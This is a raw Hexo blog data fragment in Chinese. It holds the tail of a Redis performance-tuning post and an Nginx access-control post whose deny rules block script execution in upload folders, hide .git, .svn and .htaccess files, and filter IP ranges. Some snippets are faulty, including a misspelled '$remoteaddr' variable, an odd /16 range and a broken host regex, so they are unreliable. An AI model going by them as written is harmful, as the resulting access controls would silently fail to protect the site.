在 2.6.38 内核增加了 Transparent Huge Pages (THP) 特性 ，支持大内存页 2MB 分配，默认开启。<br>当开启了 THP 时，fork 的速度会变慢，fork 之后每个内存页从原来 4KB 变为 2MB，会大幅增加重写期间父进程内存消耗。同时每次写命令引起的复制内存页单位放大了 512 倍，会拖慢写操作的执行时间，导致大量写操作慢查询。例如简单的 incr 命令也会出现在慢查询中，因此 Redis 建议将此特性进行禁用，禁用方法如下：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">echo</span> never &gt;  /sys/kernel/mm/transparent_hugepage/enabled</span><br></pre></td></tr></table></figure>\n<p>为了使机器重启后 THP 配置依然生效，可以在 <code>/etc/rc.local</code> 中追加 <code>echo never &gt; /sys/kernel/mm/transparent_hugepage/enabled</code>。</p>\n<h3 id=\"使用分布式架构\"><a href=\"#使用分布式架构\" class=\"headerlink\" title=\"使用分布式架构\"></a>使用分布式架构</h3><p>Redis 分布式架构有三个重要的手段：</p>\n<ul>\n<li>主从同步</li>\n<li>哨兵模式</li>\n<li>Redis Cluster 集群</li>\n</ul>\n<p>使用主从同步功能我们可以把写入放到主库上执行，把读功能转移到从服务上，因此就可以在单位时间内处理更多的请求，从而提升的 Redis 整体的运行速度。</p>\n<p>而哨兵模式是对于主从功能的升级，但当主节点奔溃之后，无需人工干预就能自动恢复 Redis 的正常使用。</p>\n<p>Redis Cluster 是 Redis 3.0 正式推出的，Redis 集群是通过将数据库分散存储到多个节点上来平衡各个节点的负载压力。</p>\n<p>Redis Cluster 采用虚拟哈希槽分区，所有的键根据哈希函数映射到 0 ~ 16383 整数槽内，计算公式：slot = CRC16(key) &amp; 16383，每一个节点负责维护一部分槽以及槽所映射的键值数据。这样 Redis 就可以把读写压力从一台服务器，分散给多台服务器了，因此性能会有很大的提升。</p>\n<p>在这三个功能中，只需要使用一个就行了，毫无疑问 Redis Cluster 应该是首选的实现方案，它可以把读写压力自动的分担给更多的服务器，并且拥有自动容灾的能力。</p>\n","site":{"data":{}},"excerpt":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>Redis 是基于单线程模型实现的，也就是 Redis 是使用一个线程来处理所有的客户端请求的，尽管 Redis 使用了非阻塞式 IO，并且对各种命令都做了优化（大部分命令操作时间复杂度都是 O(1)），但由于 Redis 是单线程执行的特点，因此它对性能的要求更加苛刻。</p>","more":"<h3 id=\"开启-lazy-free-特性\"><a href=\"#开启-lazy-free-特性\" class=\"headerlink\" title=\"开启 lazy free 特性\"></a>开启 lazy free 特性</h3><p>lazy free 特性是 Redis 4.0 新增的一个非常使用的功能，它可以理解为惰性删除或延迟删除。意思是在删除的时候提供异步延时释放键值的功能，把键值释放操作放在 BIO(Background I/O) 单独的子线程处理中，以减少删除删除对 Redis 主线程的阻塞，可以有效地避免删除 big key 时带来的性能和可用性问题。</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lazyfree-lazy-eviction no</span><br><span class=\"line\">lazyfree-lazy-expire no</span><br><span class=\"line\">lazyfree-lazy-server-del no</span><br><span class=\"line\">slave-lazy-flush no</span><br></pre></td></tr></table></figure>\n<ul>\n<li>lazyfree-lazy-eviction：表示当 Redis 运行内存超过 maxmeory 时，是否开启 lazy free 机制删除；</li>\n<li>lazyfree-lazy-expire：表示设置了过期时间的键值，当过期之后是否开启 lazy free 机制删除；</li>\n<li>lazyfree-lazy-server-del：有些指令在处理已存在的键时，会带有一个隐式的 del 键的操作，比如 rename 命令，当目标键已存在，Redis 会先删除目标键，如果这些目标键是一个 big key，就会造成阻塞删除的问题，此配置表示在这种场景中是否开启 lazy free 机制删除；</li>\n<li>slave-lazy-flush：针对 slave(从节点) 进行全量数据同步，slave 在加载 master 的 RDB 文件前，会运行 flushall 来清理自己的数据，它表示此时是否开启 lazy free 机制删除。</li>\n</ul>\n<p>开启其中的 lazyfree-lazy-eviction、lazyfree-lazy-expire、lazyfree-lazy-server-del 等配置，这样就可以有效的提高主线程的执行效率。</p>\n<h3 id=\"使用-slowlog-优化耗时命令\"><a href=\"#使用-slowlog-优化耗时命令\" class=\"headerlink\" title=\"使用 slowlog 优化耗时命令\"></a>使用 slowlog 优化耗时命令</h3><p>可以使用 slowlog 功能找出最耗时的 Redis 命令进行相关的优化，以提升 Redis 的运行速度，慢查询有两个重要的配置项：</p>\n<ul>\n<li>slowlog-log-slower-than ：用于设置慢查询的评定时间，也就是说超过此配置项的命令，将会被当成慢操作记录在慢查询日志中，它执行单位是微秒 (1 秒等于 1000000 微秒)；</li>\n<li>slowlog-max-len ：用来配置慢查询日志的最大记录数。</li>\n</ul>\n<p>可以根据实际的业务情况进行相应的配置，其中慢日志是按照插入的顺序倒序存入慢查询日志中，可以使用 slowlog get n 来获取相关的慢查询日志，再找到这些慢查询对应的业务进行相关的优化。</p>\n<h3 id=\"使用-Pipeline-批量操作数据\"><a href=\"#使用-Pipeline-批量操作数据\" class=\"headerlink\" title=\"使用 Pipeline 批量操作数据\"></a>使用 Pipeline 批量操作数据</h3><p>Pipeline (管道技术) 是客户端提供的一种批处理技术，用于一次处理多个 Redis 命令，从而提高整个交互的性能。</p>\n<h3 id=\"避免大量数据同时失效\"><a href=\"#避免大量数据同时失效\" class=\"headerlink\" title=\"避免大量数据同时失效\"></a>避免大量数据同时失效</h3><p>Redis 过期键值删除使用的是贪心策略，它每秒会进行 10 次过期扫描，此配置可在 redis.conf 进行配置，默认值是 hz 10，Redis 会随机抽取 20 个值，删除这 20 个键中过期的键，如果过期 key 的比例超过 25% ，重复执行此流程。</p>\n<p>如果在大型系统中有大量缓存在同一时间同时过期，那么会导致 Redis 循环多次持续扫描删除过期字典，直到过期字典中过期键值被删除的比较稀疏为止，而在整个执行过程会导致 Redis 的读写出现明显的卡顿，卡顿的另一种原因是内存管理器需要频繁回收内存页，因此也会消耗一定的 CPU。<br>为了避免这种卡顿现象的产生，我们需要预防大量的缓存在同一时刻一起过期，就简单的解决方案就是在过期时间的基础上添加一个指定范围的随机数。</p>\n<h3 id=\"连接池\"><a href=\"#连接池\" class=\"headerlink\" title=\"连接池\"></a>连接池</h3><p>尽量使用 Redis 连接池，而不是频繁创建销毁 Redis 连接，这样就可以减少网络传输次数和减少了非必要调用指令。</p>\n<h3 id=\"限制-Redis-内存大小\"><a href=\"#限制-Redis-内存大小\" class=\"headerlink\" title=\"限制 Redis 内存大小\"></a>限制 Redis 内存大小</h3><p>在 64 位操作系统中 Redis 的内存大小是没有限制的，也就是配置项 <code>maxmemory &lt;bytes&gt;</code> 是被注释掉的，这样就会导致在物理内存不足时，使用 swap 空间既交换空间，而当操心系统将 Redis 所用的内存分页移至 swap 空间时，将会阻塞 Redis 进程，导致 Redis 出现延迟，从而影响 Redis 的整体性能。</p>\n<p>因此需要限制 Redis 的内存大小为一个固定的值，当 Redis 的运行到达此值时会触发内存淘汰策略，内存淘汰策略在 Redis 4.0 之后有 8 种：</p>\n<ul>\n<li>noeviction：不淘汰任何数据，当内存不足时，新增操作会报错，Redis 默认内存淘汰策略；</li>\n<li>allkeys-lru：淘汰整个键值中最久未使用的键值；</li>\n<li>allkeys-random：随机淘汰任意键值;</li>\n<li>volatile-lru：淘汰所有设置了过期时间的键值中最久未使用的键值；</li>\n<li>volatile-random：随机淘汰设置了过期时间的任意键值；</li>\n<li>volatile-ttl：优先淘汰更早过期的键值。</li>\n</ul>\n<p>在 Redis 4.0 版本中又新增了 2 种淘汰策略：</p>\n<ul>\n<li>volatile-lfu：淘汰所有设置了过期时间的键值中，最少使用的键值；</li>\n<li>allkeys-lfu：淘汰整个键值中最少使用的键值。</li>\n</ul>\n<p>其中 allkeys-xxx 表示从所有的键值中淘汰数据，而 volatile-xxx 表示从设置了过期键的键值中淘汰数据。<br>可以根据实际的业务情况进行设置，默认的淘汰策略不淘汰任何数据，在新增时会报错。</p>\n<h3 id=\"混合持久化\"><a href=\"#混合持久化\" class=\"headerlink\" title=\"混合持久化\"></a>混合持久化</h3><p>Redis 的持久化策略是将内存数据复制到硬盘上，这样才可以进行容灾恢复或者数据迁移，但维护此持久化的功能，需要很大的性能开销。<br>在 Redis 4.0 之后，Redis 有 3 种持久化的方式：</p>\n<ul>\n<li>RDB（Redis DataBase，快照方式）将某一个时刻的内存数据，以二进制的方式写入磁盘；</li>\n<li>AOF（Append Only File，文件追加方式），记录所有的操作命令，并以文本的形式追加到文件中；</li>\n<li>混合持久化方式，Redis 4.0 之后新增的方式，混合持久化是结合了 RDB 和 AOF 的优点，在写入的时候，先把当前的数据以 RDB 的形式写入文件的开头，再将后续的操作命令以 AOF 的格式存入文件，这样既能保证 Redis 重启时的速度，又能减低数据丢失的风险。</li>\n</ul>\n<p>RDB 和 AOF 持久化各有利弊，RDB 可能会导致一定时间内的数据丢失，而 AOF 由于文件较大则会影响 Redis 的启动速度，为了能同时拥有 RDB 和 AOF 的优点，Redis 4.0 之后新增了混合持久化的方式，因此我们在必须要进行持久化操作时，应该选择混合持久化的方式。<br>查询是否开启混合持久化可以使用 <code>config get aof-use-rdb-preamble</code> 命令</p>\n<h3 id=\"禁用-THP-特性\"><a href=\"#禁用-THP-特性\" class=\"headerlink\" title=\"禁用 THP 特性\"></a>禁用 THP 特性</h3><p>Linux kernel 在 2.6.38 内核增加了 Transparent Huge Pages (THP) 特性 ，支持大内存页 2MB 分配，默认开启。<br>当开启了 THP 时，fork 的速度会变慢，fork 之后每个内存页从原来 4KB 变为 2MB，会大幅增加重写期间父进程内存消耗。同时每次写命令引起的复制内存页单位放大了 512 倍，会拖慢写操作的执行时间，导致大量写操作慢查询。例如简单的 incr 命令也会出现在慢查询中，因此 Redis 建议将此特性进行禁用，禁用方法如下：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">echo</span> never &gt;  /sys/kernel/mm/transparent_hugepage/enabled</span><br></pre></td></tr></table></figure>\n<p>为了使机器重启后 THP 配置依然生效，可以在 <code>/etc/rc.local</code> 中追加 <code>echo never &gt; /sys/kernel/mm/transparent_hugepage/enabled</code>。</p>\n<h3 id=\"使用分布式架构\"><a href=\"#使用分布式架构\" class=\"headerlink\" title=\"使用分布式架构\"></a>使用分布式架构</h3><p>Redis 分布式架构有三个重要的手段：</p>\n<ul>\n<li>主从同步</li>\n<li>哨兵模式</li>\n<li>Redis Cluster 集群</li>\n</ul>\n<p>使用主从同步功能我们可以把写入放到主库上执行，把读功能转移到从服务上，因此就可以在单位时间内处理更多的请求，从而提升的 Redis 整体的运行速度。</p>\n<p>而哨兵模式是对于主从功能的升级，但当主节点奔溃之后，无需人工干预就能自动恢复 Redis 的正常使用。</p>\n<p>Redis Cluster 是 Redis 3.0 正式推出的，Redis 集群是通过将数据库分散存储到多个节点上来平衡各个节点的负载压力。</p>\n<p>Redis Cluster 采用虚拟哈希槽分区，所有的键根据哈希函数映射到 0 ~ 16383 整数槽内，计算公式：slot = CRC16(key) &amp; 16383，每一个节点负责维护一部分槽以及槽所映射的键值数据。这样 Redis 就可以把读写压力从一台服务器，分散给多台服务器了，因此性能会有很大的提升。</p>\n<p>在这三个功能中，只需要使用一个就行了，毫无疑问 Redis Cluster 应该是首选的实现方案，它可以把读写压力自动的分担给更多的服务器，并且拥有自动容灾的能力。</p>"},{"layout":"post","title":"Nginx访问控制","abbrlink":16692,"_content":"### 前言\n\n有时，网站会被恶意入侵，可用Nginx做一些访问控制，加强一些网站安全性\n\n<!--more-->\n\n### 扩展名限制\n\n禁止访问指定目录下的程序\n\n```conf\nlocation ~ ^/images/.*\\.(php|py)$\n{\n    deny all;\n}\n\n```\n\n禁止访问指定文件名程序\n\n```conf\nlocation ~ ^/data/(attachment|avatar).*\\.(php|py)$\n{\n    deny all;\n}\n```\n\n\n### 文件或目录限制\n\n```conf\nlocation ~ ^/(\\.user.ini|\\.htaccess|\\.git|\\.svn|\\.project|LICENSE|README.md) {\n    return 404;\n}\n```\n\n排除某个目录不受限制\n\n```conf\nlocation ~ \\.well-known{\n    allow all;\n}\n```\n\n禁止访问单个目录\n\n```conf\nlocation ~ ^/static {\n    deny all;\n}\n```\n\n禁止访问多个目录，并返回指定状态码\n\n```conf\nlocation ~ ^/(static|js) {\n    return 404;\n}\n```\n\n### 限制IP访问\n\n禁止目录访问，但允许某IP访问\n\n```conf\nlocation ~ ^/mysql_loging/ {\n    allow 192.168.0.4;\n    deny all;\n}\n```\n\n限制IP或IP段访问\n\n```conf\nlocation / {\n    deny 192.168.0.4;\n    allow 192.168.1.0/16;\n    allow 10.0.0.0/24;\n    deny all;\n}\n```\n\nnginx做反向代理的时候也可以限制客户端IP\n\n```conf\nif ( $remoteaddr = 10.0.0.7 ) {\n    return 403;\n}\n\nif ( $remoteaddr = 218.247.17.130 ) {\n    set $allow_access_root 'ture';\n}\n```\n\n禁止某ip段访问并向浏览器输出一段文字（若有乱码,请在server中添加：charset utf-8;）\n\n```conf\nif ($remote_addr ~* ^211\\.149\\.(.*?)\\.(.*?)$){\nreturn 404 \"黑名单用户，拒绝访问\";\n}\n```\n\n### 禁止非法域名解析访问\n\n让使用IP访问网站的用户，或恶意接卸域名的用户，收到501错误\n\n```conf\nserver {\n    listen 80 default_server;\n    server_name _;\n    return 501;\n}\n```\n\n通过301跳转主页\n\n```conf\nserver {\n    listen 80 default_server;\n    server_name _;\n    rewrite ^(.*) http://blog.dns.com/$1 permanent;\n}\n```\n\n发现某域名恶意解析到公司的服务器IP，在server标签里添加以下代码即可，若有多个server要多处添加\n\n```conf\nif ($host !~ ^www/.tag/.com$) {\n    rewrite ^(.*) http://blog.mydns.vip$1 permanent;\n}\n```","source":"_posts/2020/4/Nginx访问控制.md","raw":"---\nlayout: post\ntitle: Nginx访问控制\ntags:\n  - nginx\ncategories:\n  - nginx\nabbrlink: 16692\n---\n### 前言\n\n有时，网站会被恶意入侵，可用Nginx做一些访问控制，加强一些网站安全性\n\n<!--more-->\n\n### 扩展名限制\n\n禁止访问指定目录下的程序\n\n```conf\nlocation ~ ^/images/.*\\.(php|py)$\n{\n    deny all;\n}\n\n```\n\n禁止访问指定文件名程序\n\n```conf\nlocation ~ ^/data/(attachment|avatar).*\\.(php|py)$\n{\n    deny all;\n}\n```\n\n\n### 文件或目录限制\n\n```conf\nlocation ~ ^/(\\.user.ini|\\.htaccess|\\.git|\\.svn|\\.project|LICENSE|README.md) {\n    return 404;\n}\n```\n\n排除某个目录不受限制\n\n```conf\nlocation ~ \\.well-known{\n    allow all;\n}\n```\n\n禁止访问单个目录\n\n```conf\nlocation ~ ^/static {\n    deny all;\n}\n```\n\n禁止访问多个目录，并返回指定状态码\n\n```conf\nlocation ~ ^/(static|js) {\n    return 404;\n}\n```\n\n### 限制IP访问\n\n禁止目录访问，但允许某IP访问\n\n```conf\nlocation ~ ^/mysql_loging/ {\n    allow 192.168.0.4;\n    deny all;\n}\n```\n\n限制IP或IP段访问\n\n```conf\nlocation / {\n    deny 192.168.0.4;\n    allow 192.168.1.0/16;\n    allow 10.0.0.0/24;\n    deny all;\n}\n```\n\nnginx做反向代理的时候也可以限制客户端IP\n\n```conf\nif ( $remoteaddr = 10.0.0.7 ) {\n    return 403;\n}\n\nif ( $remoteaddr = 218.247.17.130 ) {\n    set $allow_access_root 'ture';\n}\n```\n\n禁止某ip段访问并向浏览器输出一段文字（若有乱码,请在server中添加：charset utf-8;）\n\n```conf\nif ($remote_addr ~* ^211\\.149\\.(.*?)\\.(.*?)$){\nreturn 404 \"黑名单用户，拒绝访问\";\n}\n```\n\n### 禁止非法域名解析访问\n\n让使用IP访问网站的用户，或恶意接卸域名的用户，收到501错误\n\n```conf\nserver {\n    listen 80 default_server;\n    server_name _;\n    return 501;\n}\n```\n\n通过301跳转主页\n\n```conf\nserver {\n    listen 80 default_server;\n    server_name _;\n    rewrite ^(.*) http://blog.dns.com/$1 permanent;\n}\n```\n\n发现某域名恶意解析到公司的服务器IP，在server标签里添加以下代码即可，若有多个server要多处添加\n\n```conf\nif ($host !~ ^www/.tag/.com$) {\n    rewrite ^(.*) http://blog.mydns.vip$1 permanent;\n}\n```","slug":"2020/4/Nginx访问控制","published":1,"date":"2020-04-12T06:25:17.155Z","updated":"2020-04-12T06:34:43.631Z","comments":1,"photos":[],"link":"","_id":"ck9z76w05002m44vq2bn6hp33","content":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>有时，网站会被恶意入侵，可用Nginx做一些访问控制，加强一些网站安全性</p>\n<a id=\"more\"></a>\n<h3 id=\"扩展名限制\"><a href=\"#扩展名限制\" class=\"headerlink\" title=\"扩展名限制\"></a>扩展名限制</h3><p>禁止访问指定目录下的程序</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location ~ ^/images/.*\\.(php|py)$</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    deny all;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>禁止访问指定文件名程序</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location ~ ^/data/(attachment|avatar).*\\.(php|py)$</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    deny all;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"文件或目录限制\"><a href=\"#文件或目录限制\" class=\"headerlink\" title=\"文件或目录限制\"></a>文件或目录限制</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location ~ ^/(\\.user.ini|\\.htaccess|\\.git|\\.svn|\\.project|LICENSE|README.md) &#123;</span><br><span class=\"line\">    return 404;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>排除某个目录不受限制</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location ~ \\.well-known&#123;</span><br><span class=\"line\">    allow all;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>禁止访问单个目录</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location ~ ^/static &#123;</span><br><span class=\"line\">    deny all;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>禁止访问多个目录，并返回指定状态码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location ~ ^/(static|js) &#123;</span><br><span class=\"line\">    return 404;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"限制IP访问\"><a href=\"#限制IP访问\" class=\"headerlink\" title=\"限制IP访问\"></a>限制IP访问</h3><p>禁止目录访问，但允许某IP访问</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location ~ ^/mysql_loging/ &#123;</span><br><span class=\"line\">    allow 192.168.0.4;</span><br><span class=\"line\">    deny all;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>限制IP或IP段访问</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location / &#123;</span><br><span class=\"line\">    deny 192.168.0.4;</span><br><span class=\"line\">    allow 192.168.1.0/16;</span><br><span class=\"line\">    allow 10.0.0.0/24;</span><br><span class=\"line\">    deny all;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>nginx做反向代理的时候也可以限制客户端IP</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if ( $remoteaddr = 10.0.0.7 ) &#123;</span><br><span class=\"line\">    return 403;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">if ( $remoteaddr = 218.247.17.130 ) &#123;</span><br><span class=\"line\">    set $allow_access_root &apos;ture&apos;;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>禁止某ip段访问并向浏览器输出一段文字（若有乱码,请在server中添加：charset utf-8;）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if ($remote_addr ~* ^211\\.149\\.(.*?)\\.(.*?)$)&#123;</span><br><span class=\"line\">return 404 &quot;黑名单用户，拒绝访问&quot;;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"禁止非法域名解析访问\"><a href=\"#禁止非法域名解析访问\" class=\"headerlink\" title=\"禁止非法域名解析访问\"></a>禁止非法域名解析访问</h3><p>让使用IP访问网站的用户，或恶意接卸域名的用户，收到501错误</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">server &#123;</span><br><span class=\"line\">    listen 80 default_server;</span><br><span class=\"line\">    server_name _;</span><br><span class=\"line\">    return 501;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>通过301跳转主页</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">server &#123;</span><br><span class=\"line\">    listen 80 default_server;</span><br><span class=\"line\">    server_name _;</span><br><span class=\"line\">    rewrite ^(.*) http://blog.dns.com/$1 permanent;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>发现某域名恶意解析到公司的服务器IP，在server标签里添加以下代码即可，若有多个server要多处添加</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if ($host !~ ^www/.tag/.com$) &#123;</span><br><span class=\"line\">    rewrite ^(.*) http://blog.mydns.vip$1 permanent;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>有时，网站会被恶意入侵，可用Nginx做一些访问控制，加强一些网站安全性</p>","more":"<h3 id=\"扩展名限制\"><a href=\"#扩展名限制\" class=\"headerlink\" title=\"扩展名限制\"></a>扩展名限制</h3><p>禁止访问指定目录下的程序</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location ~ ^/images/.*\\.(php|py)$</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    deny all;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>禁止访问指定文件名程序</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location ~ ^/data/(attachment|avatar).*\\.(php|py)$</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    deny all;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"文件或目录限制\"><a href=\"#文件或目录限制\" class=\"headerlink\" title=\"文件或目录限制\"></a>文件或目录限制</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location ~ ^/(\\.user.ini|\\.htaccess|\\.git|\\.svn|\\.project|LICENSE|README.md) &#123;</span><br><span class=\"line\">    return 404;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>排除某个目录不受限制</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location ~ \\.well-known&#123;</span><br><span class=\"line\">    allow all;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>禁止访问单个目录</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location ~ ^/static &#123;</span><br><span class=\"line\">    deny all;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>禁止访问多个目录，并返回指定状态码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location ~ ^/(static|js) &#123;</span><br><span class=\"line\">    return 404;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"限制IP访问\"><a href=\"#限制IP访问\" class=\"headerlink\" title=\"限制IP访问\"></a>限制IP访问</h3><p>禁止目录访问，但允许某IP访问</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location ~ ^/mysql_loging/ &#123;</span><br><span class=\"line\">    allow 192.168.0.4;</span><br><span class=\"line\">    deny all;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>限制IP或IP段访问</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location / &#123;</span><br><span class=\"line\">    deny 192.168.0.4;</span><br><span class=\"line\">    allow 192.168.1.0/16;</span><br><span class=\"line\">    allow 10.0.0.0/24;</span><br><span class=\"line\">    deny all;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>nginx做反向代理的时候也可以限制客户端IP</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if ( $remoteaddr = 10.0.0.7 ) &#123;</span><br><span class=\"line\">    return 403;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">if ( $remoteaddr = 218.247.17.130 ) &#123;</span><br><span class=\"line\">    set $allow_access_root &apos;ture&apos;;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>禁止某ip段访问并向浏览器输出一段文字（若有乱码,请在server中添加：charset utf-8;）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if ($remote_addr ~* ^211\\.149\\.(.*?)\\.(.*?)$)&#123;</span><br><span class=\"line\">return 404 &quot;黑名单用户，拒绝访问&quot;;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"禁止非法域名解析访问\"><a href=\"#禁止非法域名解析访问\" class=\"headerlink\" title=\"禁止非法域名解析访问\"></a>禁止非法域名解析访问</h3><p>让使用IP访问网站的用户，或恶意接卸域名的用户，收到501错误</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">server &#123;</span><br><span 